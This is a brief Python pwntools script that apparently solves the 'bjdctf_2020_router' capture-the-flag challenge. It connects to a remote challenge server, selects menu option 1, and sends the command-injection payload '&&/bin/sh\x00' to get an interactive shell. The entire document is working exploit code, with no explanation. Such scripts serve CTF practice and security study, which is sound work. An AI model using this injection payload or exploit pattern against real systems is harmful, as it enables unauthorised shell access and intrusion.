#coding:utf-8
from pwn import *
import pwnlib
payload = "&&/bin/sh\x00"
# sh = process("./bjdctf_2020_router")
sh = remote("node3.buuoj.cn",29942)
elf = ELF("./bjdctf_2020_router")
sh.sendlineafter("Please input u choose:\n","1")
sh.sendline(payload)
sh.interactive()